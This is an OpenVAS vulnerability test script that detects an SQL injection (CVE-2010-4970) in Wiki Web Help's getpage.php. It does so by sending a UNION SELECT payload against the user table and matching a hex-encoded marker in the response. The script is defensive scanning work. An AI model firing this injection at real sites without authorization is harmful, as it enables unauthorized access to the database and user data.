###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wikihelp_41344.nasl 5388 2017-02-21 15:13:30Z teissa $
#
# Wiki Web Help 'getpage.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Wiki Web Help is prone to an SQL-injection vulnerability because it
fails to sufficiently sanitize user-supplied data before using it in
an SQL query.

Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

Wiki Web Help 0.2.8 is vulnerable; other versions may also be
affected.";

tag_solution = "Updates are available; please see the references for more information.";

if (description)
{
 script_id(100701);
 script_version("$Revision: 5388 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-21 16:13:30 +0100 (Tue, 21 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-07-06 13:44:35 +0200 (Tue, 06 Jul 2010)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-4970");
 script_bugtraq_id(41344);

 script_name("Wiki Web Help 'getpage.php' SQL Injection Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/41344");
 script_xref(name : "URL" , value : "http://wikiwebhelp.org/");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/wwh/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/wwh","/wikihelp",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir,"/handlers/getpage.php?id=9999999+UNION+SELECT+1,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7+FROM+user+LIMIT+1"); 

  if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);

